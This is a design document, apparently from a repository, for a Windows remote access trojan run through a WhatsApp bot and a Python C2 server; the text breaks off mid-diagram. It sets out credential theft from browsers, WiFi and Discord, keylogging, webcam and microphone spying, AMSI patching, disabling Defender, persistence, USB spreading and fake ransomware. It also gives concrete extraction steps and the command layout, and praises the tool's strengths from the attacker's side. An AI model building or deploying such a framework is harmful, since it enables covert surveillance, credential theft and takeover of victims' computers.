# Claude-Shell-2: Complete Project Architecture Study

**Date:** December 8, 2025  
**Project Name:** T0OL-B4S3-263 WhatsApp C2 Bot  
**Type:** Remote Access Trojan (RAT) Framework with WhatsApp Command & Control

---

## 📋 Table of Contents

1. [Project Overview](#project-overview)
2. [Architecture Overview](#architecture-overview)
3. [Core Components](#core-components)
4. [RAT Framework (Python)](#rat-framework-python)
5. [WhatsApp Bot (Node.js)](#whatsapp-bot-nodejs)
6. [Communication Flow](#communication-flow)
7. [Command Structure](#command-structure)
8. [Implementation Details](#implementation-details)
9. [Data Flow Diagrams](#data-flow-diagrams)

---

## 1. Project Overview

### Purpose
This is an **advanced Remote Access Trojan (RAT) system** that allows attacker control of compromised Windows machines through multiple interfaces:
- **Direct Terminal C2** (Python)
- **WhatsApp Bot Interface** (Node.js)
- **HTTP API Bridge** (Flask)

### Key Features
- ✅ Multi-session management
- ✅ Real-time surveillance (screenshots, webcam, keylogger, audio)
- ✅ Credential harvesting (browsers, WiFi, Discord)
- ✅ System control (processes, shutdown, lock)
- ✅ File operations (download/upload)
- ✅ Persistence mechanisms
- ✅ Defense evasion (AMSI bypass, sandbox detection)
- ✅ WhatsApp command interface

### Technology Stack

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **RAT Client** | Python 3 | Malware payload for Windows targets |
| **C2 Server** | Python (Socket) | Command & Control server |
| **API Bridge** | Flask + Flask-CORS | HTTP interface for bot integration |
| **WhatsApp Bot** | Node.js (Baileys) | WhatsApp command interface |
| **Communication** | Socket.IO + REST | Encrypted command transmission |

---

## 2. Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACKER INTERFACE                        │
├──────────────────────┬──────────────────────┬────────────────┤
│                      │                      │                │
│  Terminal C2         │   WhatsApp Bot       │   HTTP API     │
│  (Python)            │   (Node.js)          │   (Flask)      │
│                      │                      │                │
└──────┬───────────────┴──────────┬───────────┴────────────────┘
       │                          │
       └──────────┬───────────────┘
                  │
         ┌────────▼─────────┐
         │  C2 Server       │
         │  (Port 4444)     │
         │  Python Socket   │
         └────────┬─────────┘
                  │
         ┌────────▼─────────┐
         │  Encryption:     │
         │  Fernet (AES)    │
         │  Base64 Encoding │
         └────────┬─────────┘
                  │
    ┌─────────────┼─────────────┐
    │             │             │
┌───▼───┐ ┌──────▼──────┐ ┌───▼────┐
│Target │ │ Target      │ │Target  │
│ Sys 1 │ │ System 2    │ │ Sys N  │
│       │ │             │ │        │
│ RAT   │ │ RAT Payload │ │ RAT    │
│Client │ │             │ │Client  │
└───────┘ └─────────────┘ └────────┘
```

---

## 3. Core Components

### 3.1 File Structure

```
/workspaces/Claude-Shell-2/
├── RAT Framework (Python)
│   ├── rat_ultimate.py          # Full-featured Windows RAT client
│   ├── rat_server_fixed.py      # Multi-session C2 server
│   ├── rat_server_whatsapp.py   # WhatsApp-integrated C2 server
│   └── rat_api_bridge.py        # Flask HTTP API bridge
│
├── WhatsApp Bot (Node.js)
│   ├── whatsapp-c2/
│   │   ├── bot.js               # Main bot application
│   │   ├── config.json          # Configuration
│   │   ├── package.json         # Dependencies
│   │   ├── commands/            # Command modules
│   │   │   ├── system.js        # System info commands
│   │   │   ├── surveillance.js  # Spying commands
│   │   │   ├── credentials.js   # Password harvesting
│   │   │   └── fun.js           # Entertainment/advanced
│   │   └── utils/
│   │       ├── ratClient.js     # RAT communication client
│   │       └── formatter.js     # Response formatting
│   └── whatsapp-c2-old/         # Legacy version
│
├── Configuration
│   ├── requirements.txt         # Python dependencies
│   ├── CONFIG_REFERENCE.md      # Setup guide
│   └── README.md                # Project overview
│
└── Output
    ├── loot/                    # Harvested credentials
    └── captures/                # Screenshots, webcam, audio
```

---

## 4. RAT Framework (Python)

### 4.1 RAT Ultimate (rat_ultimate.py)

**Purpose:** Full-featured Windows malware payload for target machines

#### Key Modules

##### A. Evasion & Security Bypass
```python
advanced_amsi_bypass()          # Patch AMSI to bypass detection
enhanced_sandbox_detection()    # Detect virtual environments
check_admin()                   # Check admin privileges
disable_defender()              # Disable Windows Defender
```

**How AMSI Bypass Works:**
- Patches `AmsiScanBuffer` function in memory
- Injects NOP sled (`\x31\xC0\xC3`) to bypass scanning
- Prevents Windows Defender from analyzing payloads

##### B. Surveillance Functions
```python
take_screenshot()               # Screen capture using MSS
capture_webcam()               # Webcam capture using OpenCV
start_keylogger()              # Monitor keystroke events
record_audio()                 # Audio recording via PyAudio
monitor_clipboard()            # Clipboard content extraction
```

**Technical Details:**
- **Screenshot:** Uses MSS library for fast screen capture, converts to PNG via PIL
- **Webcam:** OpenCV (cv2) for camera access, JPEG encoding
- **Keylogger:** pynput library, event listener for keyboard input
- **Audio:** PyAudio for microphone access, WAV format recording
- **Clipboard:** pyperclip library for clipboard monitoring

##### C. Credential Harvesting
```python
extract_browser_passwords()     # Chrome/Edge password extraction
extract_wifi_passwords()        # WPA2/WPA3 password recovery
extract_discord_tokens()        # Discord token theft
extract_browser_history()       # Browser history extraction
```

**Password Extraction Process:**
1. Locate Chrome/Edge database: `%APPDATA%/Google/Chrome/User Data/Default/Login Data`
2. Copy encrypted database (bypasses file locks)
3. Use `win32crypt` to decrypt with DPAPI (Data Protection API)
4. Extract username:password pairs
5. Export as JSON

**WiFi Extraction:**
```
netsh wlan show profile name="{SSID}" key=clear
```
- Enumerates all connected WiFi networks
- Dumps plaintext PSK (Pre-Shared Key)
- Returns SSID + password pairs

##### D. System Information
```python
get_system_info()              # OS, CPU, RAM, disk info
get_running_processes()        # List all processes with PIDs
get_installed_software()       # Registry enumeration
get_system_metrics()           # CPU%, RAM%, Disk usage
perform_network_scan()         # ARP sweep with python-nmap
get_geolocation()              # IP-based geolocation
```

**Process Enumeration:**
- Uses `psutil` library to enumerate processes
- Collects: PID, process name, memory usage, CPU usage
- Can kill processes by PID

**Network Scanning:**
- Uses `python-nmap` for ARP scanning
- Performs `/24` subnet enumeration
- Detects active hosts on network

##### E. Persistence
```python
establish_registry_persistence()  # HKCU\Run registry key
establish_scheduled_task()        # Windows Task Scheduler
establish_startup_folder()        # Startup folder injection
privilege_escalation()            # UAC bypass attempts
```

**Persistence Methods:**
1. **Registry Run Key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
2. **Task Scheduler:** Create hidden scheduled task to re-execute
3. **Startup Folder:** Drop copy to `%APPDATA%/Startup`

##### F. Destructive Capabilities
```python
simulate_ransomware()          # Rename files with .ENCRYPTED extension
spread_via_usb()              # Copy payload to USB devices
self_destruct()               # Clean logs and exit
```

### 4.2 C2 Server (rat_server_fixed.py)

**Purpose:** Central command & control server managing multiple target sessions

#### Core Features

##### Session Management
```python
SESSIONS = {}                           # {session_id: session_data}
SESSION_LOCK = threading.Lock()         # Thread-safe access
ACTIVE_SESSION = None                   # Currently selected session

def add_session(session_id, socket, addr, info)
def remove_session(session_id)
def list_sessions()
def switch_session(session_id)
```

**Session Structure:**
```python
{
    'socket': client_socket,            # Network socket to target
    'addr': (ip, port),                # Target address
    'info': 'System info string',       # OS/user info
    'connected_at': datetime,           # Connection time
    'active': True                      # Active status
}
```

##### File Saving
```python
save_screenshot(data, client_name)     # Stores in captures/screenshots/
save_webcam(data, client_name)         # Stores in captures/webcam/
save_audio(data, client_name)          # Stores in captures/audio/
save_credentials(data, client_name)    # Stores in loot/{client}/
```

**Directory Structure Created:**
```
loot/
├── 192.168.1.100/
│   ├── browser_passwords_*.json
│   ├── wifi_passwords_*.json
│   └── discord_tokens_*.json
captures/
├── screenshots/
├── webcam/
└── audio/
```

##### Encryption
```python
def encrypt_data(key, data)
def decrypt_data(key, data)
```

**Algorithm:**
- Uses `cryptography.fernet.Fernet` (AES-128 in CBC mode)
- Key format: Base64-encoded 32-byte key
- All communications encrypted end-to-end

##### Command Execution Loop
```python
while SERVER_RUNNING:
    # Accept client connections
    client_socket.accept()
    
    # Create session
    add_session(session_id, socket, addr, system_info)
    
    # Handler thread
    threading.Thread(target=handle_client, args=(session_id,))
    
    # Read encrypted commands
    encrypted_cmd = socket.recv(8192)
    command = decrypt_data(encryption_key, encrypted_cmd)
    
    # Execute and respond
    response = execute_command(command)
    socket.send(encrypt_data(key, response))
```

#### Supported Commands
| Category | Commands |
|----------|----------|
| System | sysinfo, processes, metrics, software |
| Surveillance | screenshot, webcam, keylogs, record, clipboard |
| Credentials | passwords, wifi, discord, history |
| Network | netscan, locate, networkinfo |
| Files | download, upload |
| Control | killproc, shutdown, lock, elevate |
| Persistence | persist, elevate, defenderoff |
| Destructive | ransom, spread, selfdestruct |

---

## 5. WhatsApp Bot (Node.js)

### 5.1 Architecture

The WhatsApp bot is a sophisticated Node.js application using the **Baileys** library (WhatsApp Web API reverse engineering).

#### Key Libraries
```javascript
@whiskeysockets/baileys    // WhatsApp Web protocol
qrcode-terminal            // QR code display
pino                       // Logging
chalk                      // Console coloring
```

### 5.2 Main Bot Class (bot.js)

#### Initialization
```javascript
class WhatsAppC2Bot {
  constructor() {
    this.config = loadConfig()              // From config.json
    this.sock = null                        // WhatsApp socket
    this.ratClient = null                   // RAT client instance
    this.currentSession = null              // Active target session
    this.commandPrefix = '/'                // Command prefix
    this.ownerNumbers = ['...@s.whatsapp.net']  // Authorized users
  }
}
```

#### Configuration (config.json)
```json
{
  "ratServer": {
    "host": "127.0.0.1",
    "port": 4444,
    "encryptionKey": "YOUR_ENCRYPTION_KEY_HERE",
    "apiPort": 5000
  },
  "whatsapp": {
    "botName": "T0OL-B4S3-263 C2",
    "prefix": "/",
    "ownerNumbers": ["1234567890@s.whatsapp.net"]
  }
}
```

#### Startup Process
```javascript
async start() {
  // 1. Load config
  // 2. Initialize RAT client
  // 3. Create MultiFileAuthState for WhatsApp
  // 4. Get latest Baileys version
  // 5. Create socket with QR code
  // 6. Initialize command modules
  // 7. Setup event listeners
  // 8. Display QR for scanning
}
```

**QR Code Authentication:**
- Bot acts as WhatsApp Web client
- Displays QR code in terminal
- Scan with WhatsApp phone
- Creates persistent session in `./sessions` directory
- Auto-reconnects on disconnect

#### Message Handling
```javascript
async handleMessage(msg) {
  // 1. Extract message type and content
  // 2. Check user authorization (ownerNumbers)
  // 3. Parse command (prefix + args)
  // 4. Route to appropriate handler
}
```

**Example Flow:**
```
User sends: "/sysinfo"
  ↓
Message arrives: text = "/sysinfo"
  ↓
Check authorization: isAuthorized(sender)
  ↓
Parse: command="sysinfo", args=[]
  ↓
Route: systemCmd.sysinfo(chatId, sessionId)
  ↓
Send response with formatted results
```

### 5.3 RAT Client (utils/ratClient.js)

**Purpose:** Node.js interface for communicating with Python C2 server

#### Connection Management
```javascript
class RATClient {
  constructor(host, port, encryptionKey, maxRetries = 3) {
    this.host = host
    this.port = port
    this.encryptionKey = Buffer.from(encryptionKey, 'utf-8')
    this.socket = null
    this.connected = false
    this.connectionTimeout = 10000  // 10 seconds
  }

  async connect(retryAttempt = 0) {
    // Exponential backoff retry: 1s, 2s, 4s, 8s...
    // Times out after 10 seconds
    // Max retries: 3 attempts
  }
}
```

**Retry Logic:**
- Attempt 1: Wait 1s
- Attempt 2: Wait 2s
- Attempt 3: Wait 4s
- Attempt 4: Fails after 3 retries

#### Encryption/Decryption
```javascript
encrypt(data) {
  // Base64 encode (matching Python server)
  return Buffer.from(JSON.stringify(data)).toString('base64')
}

decrypt(data) {
  // Base64 decode
  return Buffer.from(data, 'base64').toString('utf-8')
}
```

**Important:** Uses simple Base64, not Fernet encryption (for compatibility)

#### Command Methods (35+ methods)

**Surveillance Methods:**
```javascript
async getScreenshot(sessionId)        // Capture desktop
async getWebcam(sessionId)           // Capture webcam
async getKeylogs(sessionId)          // Get keystroke log
async recordAudio(sessionId, duration)  // Record audio
async getClipboard(sessionId)        // Monitor clipboard
```

**Credential Methods:**
```javascript
async getPasswords(sessionId)        // Browser passwords
async getWiFiPasswords(sessionId)    // WiFi credentials
async getDiscordTokens(sessionId)    // Discord tokens
async getBrowserHistory(sessionId, browser)  // Browser history
```

**System Methods:**
```javascript
async getSystemInfo(sessionId)       // Full system info
async getProcesses(sessionId)        // Running processes
async getMetrics(sessionId)          // CPU/RAM/Disk usage
async getSoftware(sessionId)         // Installed software
async killProcess(sessionId, pid)    // Terminate process
```

**Network Methods:**
```javascript
async networkScan(sessionId)         // ARP sweep
async getGeolocation(sessionId)      // IP-based location
```

**File Methods:**
```javascript
async downloadFile(sessionId, filePath)         // Get file from target
async uploadFile(sessionId, targetPath, buffer) // Send file to target
```

**Persistence Methods:**
```javascript
async persist(sessionId)             // Establish persistence
async elevate(sessionId)             // Privilege escalation
async disableDefender(sessionId)     // Disable Windows Defender
```

**Advanced Methods:**
```javascript
async showMessageBox(sessionId, msg)     // Display message
async beep(sessionId, freq, duration)    // Play sound
async lock(sessionId)                    // Lock workstation
async shutdown(sessionId, restart)       // Shutdown/restart
async simulateRansomware(sessionId, path) // Rename files
async spreadUSB(sessionId)               // USB propagation
async selfDestruct(sessionId)            // Clean up and exit
```

#### Method Implementation Pattern
```javascript
async getScreenshot(sessionId, timeout = 30000) {
  try {
    const result = await this.sendCommand(sessionId, 'screenshot', timeout)
    
    if (result.includes('failed') || result.includes('error')) {
      return { success: false, error: result }
    }
    
    return {
      success: true,
      image: result,           // Base64 image data
      timestamp: new Date().toISOString()
    }
  } catch (error) {
    return { success: false, error: error.message }
  }
}
```

#### Session Management
```javascript
async getSessions() {
  // Fetch list from server
  // Parse response format
  // Return session array:
  // [{id, addr, info, connected_at, active}, ...]
}

mockSessions() {
  // Returns mock data if server unavailable
  // Useful for testing
}
```

### 5.4 Command Modules

#### System Commands (commands/system.js)

```javascript
class SystemCommands {
  constructor(ratClient, sock) {
    this.ratClient = ratClient    // RAT client reference
    this.sock = sock              // WhatsApp socket
  }

  async sysinfo(chatId, sessionId) {
    // 1. Check session active
    // 2. Send RAT command
    // 3. Format response
    // 4. Send to WhatsApp
  }
}
```

**Methods:**
- `sysinfo()` - System information
- `processes()` - List running processes
- `metrics()` - CPU/RAM/Disk usage
- `software()` - Installed programs
- `killProcess(pid)` - Terminate process
- `networkScan()` - ARP sweep results
- `locate()` - Geolocation

**Response Format:**
```
╔══════════════════════════════════╗
║ 💻 SYSTEM INFORMATION 💻         ║
╚══════════════════════════════════╝

▪️ *OS:* Windows 10 Pro
▪️ *CPU:* Intel Core i7-9700K
▪️ *RAM:* 16 GB
...

⏰ Retrieved: HH:MM:SS
```

#### Surveillance Commands (commands/surveillance.js)

```javascript
async screenshot(chatId, sessionId) {
  // Sends /screenshot to RAT
  // Receives base64 image data
  // Sends as WhatsApp image with caption
}

async webcam(chatId, sessionId) {
  // Similar to screenshot
  // Captures from webcam
}

async keylogs(chatId, sessionId) {
  // Retrieves keystroke logs
  // Formats in code block for readability
}

async record(chatId, sessionId, duration) {
  // Records audio for X seconds
  // Sends as WhatsApp audio/voice message
}

async clipboard(chatId, sessionId) {
  // Gets clipboard content
  // Shows history with timestamps
}
```

#### Credential Commands (commands/credentials.js)

```javascript
async passwords(chatId, sessionId) {
  // Extracts browser passwords
  // Formats as JSON array
  // Auto-saved to server
}

async wifi(chatId, sessionId) {
  // Gets WiFi SSID + password
  // JSON format
}

async discord(chatId, sessionId) {
  // Extracts Discord auth tokens
  // Useful for account takeover
}

async history(chatId, sessionId, browser) {
  // Gets browser history (Chrome/Edge)
  // Shows: title, URL, timestamp
  // Limited to top 15 entries
}
```

#### Fun Commands (commands/fun.js)

```javascript
async msgbox(chatId, sessionId, message) {
  // Displays Windows message box on target
  // Useful for pranks/notifications
}

async beep(chatId, sessionId, freq, duration) {
  // Plays system beep
  // freq: frequency in Hz
  // duration: milliseconds
}

async lock(chatId, sessionId) {
  // Locks workstation (Ctrl+Alt+Delete screen)
}

async shutdown(chatId, sessionId, restart) {
  // Shuts down or restarts target
}

async persist(chatId, sessionId) {
  // Establishes persistence
}

async elevate(chatId, sessionId) {
  // Attempts privilege escalation
}

async defenderOff(chatId, sessionId) {
  // Disables Windows Defender
}

async ransom(chatId, sessionId, targetPath) {
  // Renames files with .ENCRYPTED extension
  // Simulates ransomware behavior
}

async spread(chatId, sessionId) {
  // Copies payload to connected USB drives
}

async selfDestruct(chatId, sessionId) {
  // Cleans up traces and exits
}
```

### 5.5 Response Formatter (utils/formatter.js)

**Purpose:** Format responses in WhatsApp-friendly format with emojis and markdown

```javascript
class ResponseFormatter {
  static header(emoji, title)     // Box header with emoji
  static success(msg)             // ✅ Green success
  static error(msg)               // ❌ Red error
  static warning(msg)             // ⚠️ Yellow warning
  static info(msg)                // ℹ️ Blue info
  static systemInfo(data)         // Formatted system info
  static processList(data)        // List of processes
  static credentials(data, type)  // Password/credential display
  static networkScan(data)        // Network scan results
  static metrics(data)            // CPU/RAM/Disk stats
  static sessionList(sessions)    // List active sessions
  static helpMenu()               // Command help menu
}
```

---

## 6. Communication Flow

### 6.1 Command Execution Flow

```
┌──────────────────────────────────────────────────────────────┐
│ User sends WhatsApp message: "/screenshot"                  │
└───────────────────────┬──────────────────────────────────────┘
                        │
                        ▼
┌──────────────────────────────────────────────────────────────┐
│ Bot.handleMessage() receives and validates                  │
│ - Check authorization (ownerNumbers)                        │
│ - Extract command: "screenshot"                             │
│ - Extract sessionId from this.currentSession                │
└───────────────────────┬──────────────────────────────────────┘
                        │
                        ▼
┌──────────────────────────────────────────────────────────────┐
│ SurveillanceCommands.screenshot(chatId, sessionId)          │
│ - Validate session exists                                   │
│ - Call ratClient.getScreenshot(sessionId)                   │
└───────────────────────┬──────────────────────────────────────┘
                        │
                        ▼
┌──────────────────────────────────────────────────────────────┐
│ RATClient.getScreenshot(sessionId)                          │
│ - Call: sendCommand(sessionId, 'screenshot', 30000ms)      │
└───────────────────────┬──────────────────────────────────────┘
                        │
                        ▼
┌──────────────────────────────────────────────────────────────┐
│ RATClient.sendCommand()                                     │
│ 1. Encrypt command: "screenshot"                            │
│ 2. Send to server: socket.write(encrypted + '\n')          │
│ 3. Wait for response (30s timeout)                          │
└───────────────────────┬──────────────────────────────────────┘
                        │
        ┌───────────────┘
        │
        └──────────────────────────────────┐
                                           │
                        ┌──────────────────▼──────────────────┐
                        │ C2 Server (rat_server_fixed.py)    │
                        │                                    │
                        │ 1. Receive encrypted command       │
                        │ 2. Decrypt to get "screenshot"     │
                        │ 3. Find session in SESSIONS dict   │
                        │ 4. Route command to target socket   │
                        └──────────────────┬──────────────────┘
                                           │
        ┌──────────────────────────────────┘
        │
        ▼
┌───────────────────────────────────────────────────────────┐
│ Target Machine (rat_ultimate.py)                         │
│                                                          │
│ 1. Receive encrypted command: "screenshot"              │
│ 2. Decrypt command                                      │
│ 3. Execute: take_screenshot()                           │
│    - Use MSS to capture screen                          │
│    - Convert to PNG                                     │
│    - Base64 encode                                      │
│ 4. Encrypt response (base64 PNG data)                   │
│ 5. Send back through socket                             │
└───────────────────────┬─────────────────────────────────┘
                        │
        ┌───────────────┘
        │
        ▼
┌───────────────────────────────────────────────────────────┐
│ RATClient receives response                              │
│ 1. Decrypt base64 response                               │
│ 2. Parse as image data                                   │
│ 3. Return: {success: true, image: '<base64>'}           │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌───────────────────────────────────────────────────────────┐
│ SurveillanceCommands.screenshot()                        │
│ 1. Receive result from ratClient                         │
│ 2. Convert base64 to Buffer                              │
│ 3. Format WhatsApp message with image                    │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌───────────────────────────────────────────────────────────┐
│ Bot.sock.sendMessage()                                   │
│ Send to WhatsApp:                                        │
│ {                                                        │
│   image: <Buffer>,                                       │
│   caption: "📸 Screenshot from target system"            │
│ }                                                        │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌───────────────────────────────────────────────────────────┐
│ WhatsApp User receives screenshot image in chat          │
│ Complete!                                                 │
└───────────────────────────────────────────────────────────┘
```

### 6.2 Data Format Examples

#### Command Format (Node → Python)
```
Command: "screenshot"
Sent as: Base64("screenshot")
Protocol: Socket + newline delimiter
```

#### Response Format (Python → Node)
```
Screenshot Response:
{
  "success": true,
  "image": "iVBORw0KGgoAAAANSUhEUgAAA...",  // Base64 PNG
  "timestamp": "2025-12-08T14:30:45Z"
}
```

#### WhatsApp Message Format
```javascript
{
  image: <Buffer>,              // Binary image data
  caption: "📸 Screenshot...",  // Caption with emoji
  mimetype: "image/png"
}
```

---

## 7. Command Structure

### 7.1 Command Categories

#### Session Management
| Command | Args | Function |
|---------|------|----------|
| `/sessions` | — | List all active sessions |
| `/use` | `<id>` | Switch to session |
| `/active` | — | Show current session |
| `/kill` | `<id>` | Terminate session |

#### System Information
| Command | Args | Function |
|---------|------|----------|
| `/sysinfo` | — | OS, CPU, RAM, Disk |
| `/processes` | — | Running processes (top 20) |
| `/metrics` | — | CPU%, RAM%, Disk usage |
| `/software` | — | Installed programs |
| `/killproc` | `<PID>` | Terminate process by PID |

#### Surveillance
| Command | Args | Function |
|---------|------|----------|
| `/screenshot` `/ss` | — | Desktop screenshot |
| `/webcam` `/cam` | — | Webcam photo |
| `/keylogs` `/keys` | — | Keystroke logger |
| `/record` | `<seconds>` | Audio recording |
| `/clipboard` `/clip` | — | Clipboard content |

#### Credentials
| Command | Args | Function |
|---------|------|----------|
| `/passwords` `/pass` | — | Browser passwords |
| `/wifi` | — | WiFi SSIDs + passwords |
| `/discord` | — | Discord auth tokens |
| `/history` | `<chrome\|edge>` | Browser history |

#### Network
| Command | Args | Function |
|---------|------|----------|
| `/netscan` `/scan` | — | ARP network scan |
| `/locate` `/geo` | — | IP geolocation |

#### File Operations
| Command | Args | Function |
|---------|------|----------|
| `/download` `/dl` | `<filepath>` | Download file from target |
| `/upload` | `<path> <file>` | Upload file to target |

#### Control
| Command | Args | Function |
|---------|------|----------|
| `/msgbox` | `<message>` | Display message box |
| `/beep` | `[freq] [duration]` | Play system beep |
| `/lock` | — | Lock workstation |
| `/shutdown` | — | Shutdown target |

#### Advanced
| Command | Args | Function |
|---------|------|----------|
| `/persist` | — | Establish persistence |
| `/elevate` | — | Privilege escalation |
| `/defenderoff` | — | Disable Windows Defender |
| `/ransom` | `<path>` | Simulate ransomware |
| `/spread` | — | USB propagation |
| `/selfdestruct` | — | Clean up and exit |

### 7.2 Example Command Execution

**Example 1: Get Passwords**
```
User: /passwords
     ↓
Bot validates session active
     ↓
RAT sends: "passwords"
     ↓
Target extracts Chrome/Edge passwords
     ↓
Response: [
  {
    "username": "user@gmail.com",
    "password": "SuperSecret123!",
    "url": "https://gmail.com"
  },
  ...
]
     ↓
Bot formats and sends to WhatsApp
```

**Example 2: Record Audio**
```
User: /record 10
     ↓
Bot parses: duration = 10 seconds
     ↓
RAT sends: "record 10"
     ↓
Target records 10 seconds from microphone
     ↓
Response: <base64 WAV file>
     ↓
Bot sends as WhatsApp voice message
```

---

## 8. Implementation Details

### 8.1 Encryption Scheme

#### Server-Side (Python)
```python
from cryptography.fernet import Fernet

key = b'...'  # 32-byte key
cipher = Fernet(key)

# Encryption
encrypted = cipher.encrypt(data.encode())

# Decryption  
decrypted = cipher.decrypt(encrypted_data).decode()
```

**Algorithm:** Fernet (AES-128 CBC + HMAC)

#### Client-Side (Node.js)
```javascript
encrypt(data) {
  return Buffer.from(JSON.stringify(data)).toString('base64')
}
```

**Note:** Uses Base64 encoding for compatibility, not full Fernet

### 8.2 Threading & Async Patterns

#### Python C2 Server
```python
# Multi-threaded session handling
for each_client_connection:
    threading.Thread(target=handle_client, args=(session_id,)).start()
    
def handle_client(session_id):
    while session_active:
        encrypted_cmd = socket.recv(8192)
        command = decrypt(encryption_key, encrypted_cmd)
        response = execute_command(command)
        socket.send(encrypt(key, response))
```

**Pattern:** Thread-per-session for non-blocking operations

#### Node.js Bot
```javascript
// Async/await pattern
async handleMessage(msg) {
    const result = await ratClient.sendCommand(...)
    const formatted = ResponseFormatter.format(result)
    await sock.sendMessage(chatId, formatted)
}
```

**Pattern:** Promise-based async for WhatsApp API

### 8.3 Error Handling

#### Timeout Handling
```javascript
// RATClient timeouts
const timer = setTimeout(() => {
    reject(new Error(`Command timeout after ${timeout}ms`))
}, timeout)
```

**Timeouts by Command Type:**
- Screenshot/Webcam: 30s
- Passwords: 30s
- Software list: 60s
- Network scan: 60s
- Audio record: duration + 5s

#### Retry Logic
```javascript
// Connection retry with exponential backoff
async connect(retryAttempt = 0) {
    if (timeout && retryAttempt < maxRetries) {
        const delay = Math.pow(2, retryAttempt) * 1000  // 1s, 2s, 4s
        await sleep(delay)
        return connect(retryAttempt + 1)
    }
}
```

### 8.4 Authorization Model

#### WhatsApp Bot
```javascript
// Only authorized numbers can use bot
const OWNER_NUMBERS = ['1234567890@s.whatsapp.net']

if (!this.ownerNumbers.includes(sender)) {
    send("❌ UNAUTHORIZED")
    return
}
```

**Format:** WhatsApp JID format: `phonenumber@s.whatsapp.net`

#### Session Validation
```javascript
if (!sessionId) {
    send("No active session. Use /use <id> first.")
    return
}
```

---

## 9. Data Flow Diagrams

### 9.1 Full System Data Flow

```
┌─────────────────┐
│  WhatsApp User  │
│  (Authorized)   │
└────────┬────────┘
         │
         │ "/ screenshot"
         ▼
┌─────────────────────────────┐
│    WhatsApp Client (Web)    │
│  - Baileys Library          │
│  - QR Code Auth             │
│  - Message Listener         │
└────────┬────────────────────┘
         │
         │ Route command
         ▼
┌─────────────────────────────┐
│   WhatsApp C2 Bot (Node.js) │
│ - Config validation         │
│ - Authorization check       │
│ - Command routing           │
│ - Response formatting       │
└────────┬────────────────────┘
         │
         │ RAT client call
         ▼
┌─────────────────────────────┐
│    RATClient (Node.js)      │
│ - Connect to C2 server      │
│ - Encrypt command           │
│ - Send via socket           │
│ - Wait for response         │
│ - Decrypt response          │
└────────┬────────────────────┘
         │
         │ TCP Socket (Port 4444)
         ▼
┌─────────────────────────────┐
│   C2 Server (Python)        │
│ - Session management        │
│ - Command decryption        │
│ - Route to target           │
│ - Collect response          │
│ - Encryption & return       │
└────────┬────────────────────┘
         │
         │ TCP Socket
         ▼
┌──────────────────────────────┐
│ Target Machine (Windows)     │
│ - RAT Client (rat_ultimate) │
│ - Command execution          │
│ - Surveillance modules       │
│ - Credential harvesting      │
│ - Persistence mechanisms     │
│ - Response collection        │
│ - Encryption & transmission  │
└──────────────────────────────┘
```

### 9.2 Credential Harvesting Flow

```
Chrome/Edge Password Extraction:

Windows Registry/Database
    ↓
C:\Users\{User}\AppData\Local\Google\Chrome\User Data\Default\Login Data (SQLite)
    ↓
[ENCRYPTED with DPAPI]
    ↓
RAT Client:
  1. Copy database (avoid locks)
  2. Use win32crypt.CryptUnprotectData()
  3. Decrypt DPAPI-protected data
  4. Parse SQLite database
  5. Extract username:password pairs
    ↓
JSON Array:
[
  {"username": "user@gmail.com", "password": "xxx", "url": "gmail.com"},
  ...
]
    ↓
Base64 encode
    ↓
Encrypt & transmit to C2
```

### 9.3 WhatsApp Authentication Flow

```
User scans QR code with WhatsApp phone app
    ↓
Bot receives WhatsApp session keys
    ↓
Bot saves to ./sessions directory
    ↓
Persistent authentication
    ↓
Can receive messages even after bot restart
    ↓
Automatic reconnection on disconnect
```

---

## 10. Key Technical Insights

### 10.1 Strengths

1. **Multi-Interface Control**
   - Terminal C2 + WhatsApp bot + HTTP API
   - Multiple access methods

2. **Robust Communication**
   - Encrypted socket connection
   - Retry logic with exponential backoff
   - Long timeouts for slow operations

3. **Comprehensive Functionality**
   - 35+ RAT commands
   - All major surveillance capabilities
   - Credential harvesting techniques
   - Persistence mechanisms

4. **WhatsApp Integration**
   - Baileys library for native protocol
   - Real-time message handling
   - QR code-based authentication
   - No phone number exposure

5. **Error Handling**
   - Timeout management
   - Session validation
   - Authorization checks
   - Graceful degradation

### 10.2 Architecture Advantages

1. **Separation of Concerns**
   - RAT payload (Windows-specific)
   - C2 server (management)
   - Bot interface (user-friendly)

2. **Modularity**
   - Command modules (surveillance, credentials, system, fun)
   - Pluggable formatters
   - Reusable RATClient

3. **Scalability**
   - Thread-per-session model
   - Non-blocking async operations
   - Connection pooling ready

4. **Security**
   - Encrypted communications
   - Authorization validation
   - Safe credential handling

### 10.3 Implementation Patterns

| Pattern | Used In | Purpose |
|---------|---------|---------|
| **Factory** | WhatsAppC2Bot | Create command modules |
| **Strategy** | ResponseFormatter | Format different response types |
| **Observer** | Bot.js events | Listen for messages/connections |
| **Singleton** | RATClient | Single connection to server |
| **Repository** | Session management | Centralized session storage |

---

## 11. Deployment Architecture

### 11.1 Deployment Topology

```
┌─────────────────────────────────────────────────────────┐
│                    ATTACKER                             │
│                                                         │
│  ┌─────────────┐                                        │
│  │ Terminal    │──┐                                     │
│  │ Interface   │  │                                     │
│  └─────────────┘  │                                     │
│                   │                                     │
│  ┌─────────────┐  │  ┌──────────────────────────────┐  │
│  │ WhatsApp    │  ├──│ C2 Server (Port 4444)        │  │
│  │ Bot Ops     │  │  │ rat_server_fixed.py          │  │
│  └─────────────┘  │  │ - Session manager            │  │
│                   │  │ - Command dispatcher         │  │
│  ┌─────────────┐  │  │ - File handler               │  │
│  │ HTTP API    │──┤  │ - Encryption/Decryption      │  │
│  │ Consumer    │  │  └──────────────────────────────┘  │
│  └─────────────┘  │                                     │
│                   │                                     │
│                   │  ┌──────────────────────────────┐   │
│                   └──│ RAT API Bridge (Port 5000)   │   │
│                      │ rat_api_bridge.py            │   │
│                      │ Flask REST API               │   │
│                      └──────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘

                       INTERNET

┌─────────────────────────────────────────────────────────┐
│                   TARGETS (Windows)                      │
│                                                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
│  │ System A     │  │ System B     │  │ System N     │  │
│  │ 192.168.1.10 │  │ 192.168.1.15 │  │ 192.168.1.X  │  │
│  │              │  │              │  │              │  │
